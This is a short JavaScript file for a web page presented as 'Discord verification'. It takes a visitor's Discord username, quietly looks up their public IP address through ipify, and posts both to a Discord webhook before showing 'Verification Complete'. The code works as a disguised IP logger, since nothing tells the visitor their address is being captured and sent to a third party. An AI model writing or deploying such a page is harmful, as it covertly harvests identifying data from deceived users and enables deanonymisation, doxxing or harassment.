const ipifyAPI = "https://api.ipify.org?format=json";

// Keep your current Discord webhook URL here.
const webhookURL = "YOUR_EXISTING_WEBHOOK_URL";

async function getIP() {
    try {
        const response = await fetch(ipifyAPI);

        if (!response.ok) {
            throw new Error(`IP service returned ${response.status}`);
        }

        const data = await response.json();
        return data.ip;
    } catch (error) {
        console.error("Error fetching IP:", error);
        return "Unavailable";
    }
}

async function sendToDiscord(discordName, ip) {
    const payload = {
        embeds: [
            {
                title: "New Verification",
                color: 5793266,
                fields: [
                    {
                        name: "Discord Username",
                        value: discordName,
                        inline: false
                    },
                    {
                        name: "IP Address",
                        value: ip,
                        inline: false
                    }
                ],
                timestamp: new Date().toISOString()
            }
        ],
        allowed_mentions: {
            parse: []
        }
    };

    const response = await fetch(webhookURL, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(payload)
    });

    if (!response.ok) {
        throw new Error(`Discord returned ${response.status}`);
    }
}

const form = document.getElementById("verification-form");
const input = document.getElementById("discord-name");
const button = document.getElementById("verify-button");
const status = document.getElementById("status");
const title = document.getElementById("title");
const description = document.getElementById("description");

form.addEventListener("submit", async (event) => {
    event.preventDefault();

    const discordName = input.value.trim();

    if (discordName.length < 2) {
        status.textContent = "Enter a valid Discord username.";
        status.className = "error";
        return;
    }

    button.disabled = true;
    status.textContent = "Verifying…";
    status.className = "";

    try {
        const ip = await getIP();
        await sendToDiscord(discordName, ip);

        form.remove();
        title.textContent = "Verification Complete";
        description.textContent = "You may now return to Discord.";
        status.textContent = `Verified as ${discordName}`;
        status.className = "success";
    } catch (error) {
        console.error(error);
        status.textContent = "Verification failed. Please try again.";
        status.className = "error";
        button.disabled = false;
    }
});
